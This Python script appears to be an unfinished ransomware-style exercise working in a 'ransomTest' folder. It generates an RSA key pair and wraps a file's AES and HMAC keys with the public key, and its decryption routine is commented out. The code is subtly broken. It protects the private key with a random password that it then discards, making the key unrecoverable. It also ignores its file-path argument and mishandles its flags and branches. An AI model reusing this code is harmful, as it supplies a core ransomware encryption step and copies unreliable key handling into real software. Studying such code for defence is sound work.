import os

import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, hmac, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding as PADDING
from fileEncryption import MyFileEncryptMAC

import json

# Constants

PUB_FOUND = False
PRIV_FOUND = False
PASS_SIZE = 10
IV_SIZE = 16
PAD_SIZE = 128
HMAC_KEY = 16
HMAC_KEY_LEN = len(str(HMAC_KEY))
KEY_SIZE = 32
ENC_KEY_SIZE = 32
FILE_PATH = "C:/Users/corni/Desktop/ransomTest"
BACKEND = default_backend()


def keyCheck():
    
    pubKey = "/publicTest.pem"
    privKey = "/privateTest.pem"

    pubFilePath = FILE_PATH + pubKey
    privFilePath = FILE_PATH + privKey

    pubExists = os.path.isfile(pubFilePath)
    privExists = os.path.isfile(privFilePath)

    PRIV_PASS = os.urandom(PASS_SIZE) # In bytes!!!


    # Check if keys already exist 

    if privExists:
        PRIV_FOUND = 1
        print("\nFound private key! \nFilePath: " + privFilePath)

            # Double-check that public key now exists
        if pubExists:
            PUB_FOUND = 1
            print("Found public key! \nFilePath: " + pubFilePath)
            

        elif (pubExists == False):
            PUB_FOUND = 0
            print("Did not find public key!\nBoolean value: " + str(PUB_FOUND))
        

    elif (pubExists == False):
        PRIV_FOUND = 0
        print("\nDid not find private key!\nBoolean value: " + str(PRIV_FOUND))     

        # generate private key

        print("\nGenerating privKey:")

        private_key = rsa.generate_private_key(
            public_exponent = 65537, 
            key_size = 2048, 
            backend = default_backend()) 

        # Serialize private key 

        private_pem = private_key.private_bytes(
            encoding = serialization.Encoding.PEM, 
            format = serialization.PrivateFormat.TraditionalOpenSSL, 
            encryption_algorithm=serialization.BestAvailableEncryption(PRIV_PASS))
        

        with open(FILE_PATH + privKey, 'wb') as f:
            print("Writing privKey:")
            f.write(private_pem)

        # Serialize public

        print("Generating pubKey:")

        public_key = private_key.public_key()
        public_pem = public_key.public_bytes(encoding = serialization.Encoding.PEM, format = serialization.PublicFormat.SubjectPublicKeyInfo)
        
        with open(FILE_PATH + pubKey, 'wb') as f:

            print("Writing pubKey:")
            f.write(public_pem)


def MyRSAEncrypt(filepath, RSA_Publickey_filepath):

    C, IV, tag, EncKey, HMACKey, ext = MyFileEncryptMAC(FILE_PATH)

    with open(RSA_Publickey_filepath, 'rb') as pubKey:
        publicPEM = serialization.load_pem_public_key(pubKey.read(), backend = BACKEND)
        #print("Public key: " + str(publicPEM))

    concatKey = EncKey + HMACKey

    RSACipher = publicPEM.encrypt(
        concatKey,
        PADDING.OAEP(mgf = PADDING.MGF1(algorithm = hashes.SHA256()), 
        algorithm = hashes.SHA256(), 
        label = None))

    return(RSACipher, C, IV, tag, ext)



# def MyRSADecrypt(RSACipher, C, IV, tag, ext, RSA_Privatekey_filepath):


    


#--------------------------------------------------------
# MAIN
#--------------------------------------------------------


def main():

    
    print("Running Test")
    keyCheck()


if __name__ == '__main__':
    main()